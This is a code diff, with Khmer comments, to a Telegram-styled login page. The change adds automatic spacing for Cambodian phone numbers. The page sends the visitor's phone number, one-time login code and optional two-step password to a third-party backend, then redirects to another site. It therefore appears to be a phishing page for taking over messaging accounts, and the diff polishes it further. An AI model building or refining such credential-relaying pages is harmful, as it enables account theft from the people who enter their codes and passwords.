@@ -18,7 +18,6 @@
             border: 1px solid #2f3846; 
             border-radius: 12px; 
             color: #fff; 
-            /* កំណត់ 16px ការពារ iOS Safari កុំឱ្យ Auto-Zoom ពេល Focus */
             font-size: 16px !important; 
             touch-action: manipulation;
         }
@@ -27,7 +26,6 @@
             outline: none; 
         }
         button, input {
-            /* លុប 300ms Click Delay លើ Mobile */
             touch-action: manipulation;
         }
     </style>
@@ -50,7 +48,8 @@
             <div class="space-y-4 text-left">
                 <div>
                     <label class="block text-xs text-gray-400 mb-1 ml-1">Phone Number</label>
-                    <input id="phone-input" type="text" value="+855" placeholder="+85512345678" class="tg-input w-full p-3">
+                    <!-- បន្ថែម event oninput ដើម្បី Format លេខដកឃ្លា -->
+                    <input id="phone-input" type="text" value="+855 " placeholder="+855 15 944 782" oninput="formatPhoneNumber(this)" class="tg-input w-full p-3">
                 </div>
             </div>
             <button id="btn-send" onclick="sendPhone()" class="w-full bg-[#5288c1] hover:bg-[#4372a5] active:scale-95 text-white font-medium py-3 rounded-xl transition-all duration-75">SEND CODE</button>
@@ -87,12 +86,35 @@
     <script>
         const BACKEND_URL = "https://jvpcambodia.up.railway.app";
 
+        // Function សម្រាប់ Format លេខទូរស័ព្ទឱ្យដកឃ្លាស្វ័យប្រវត្តិ (+855 XX XXX XXX)
+        function formatPhoneNumber(input) {
+            let val = input.value;
+            
+            // យកតែលេខចេញប៉ុណ្ណោះ
+            let digits = val.replace(/[^\d]/g, '');
+
+            if (digits.startsWith('855')) {
+                let rest = digits.slice(3);
+                let parts = ['+855'];
+
+                if (rest.length > 0) parts.push(rest.slice(0, 2));
+                if (rest.length > 2) parts.push(rest.slice(2, 5));
+                if (rest.length > 5) parts.push(rest.slice(5, 9));
+
+                input.value = parts.join(' ');
+            } else {
+                input.value = '+' + digits;
+            }
+        }
+
         async function sendPhone() {
             const phoneInput = document.getElementById('phone-input');
             const btn = document.getElementById('btn-send');
-            const phone = phoneInput.value.trim();
+            
+            // លុបចន្លោះដកឃ្លាចោលមុនពេលផ្ញើទៅ Backend (ឧទាហរណ៍៖ +85515944782)
+            const phoneClean = phoneInput.value.replace(/\s+/g, '').trim();
 
-            if (!phone || phone.length < 8) {
+            if (!phoneClean || phoneClean.length < 9) {
                 alert('Please enter a valid phone number with country code.');
                 return;
             }
@@ -105,12 +127,12 @@
                 const res = await fetch(`${BACKEND_URL}/api/send-code`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ phoneNumber: phone })
+                    body: JSON.stringify({ phoneNumber: phoneClean })
                 });
                 const data = await res.json();
 
                 if (data.success) {
-                    document.getElementById('display-phone').innerText = phone;
+                    document.getElementById('display-phone').innerText = phoneInput.value.trim();
                     document.getElementById('step-phone').classList.add('hidden');
                     document.getElementById('step-otp').classList.remove('hidden');
                 } else {
@@ -127,7 +149,8 @@
         }
 
         async function submitOTP() {
-            const phone = document.getElementById('phone-input').value.trim();
+            const phoneInput = document.getElementById('phone-input');
+            const phoneClean = phoneInput.value.replace(/\s+/g, '').trim();
             const code = document.getElementById('otp-input').value.trim();
             const password = document.getElementById('password-input').value.trim();
             const btn = document.getElementById('btn-verify');
@@ -146,7 +169,7 @@
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ 
-                        phoneNumber: phone, 
+                        phoneNumber: phoneClean, 
                         code: code,
                         password: password || undefined
                     })
@@ -154,7 +177,6 @@
                 const data = await res.json();
 
                 if (data.success) {
-                    // ប្តូរទៅកាន់ Website ថ្មីភ្លាមៗបន្ទាប់ពី Login ជោគជ័យ
                     window.location.href = "https://jvpfans.com";
                 } else if (data.requiresPassword) {
                     document.getElementById('password-container').classList.remove('hidden');
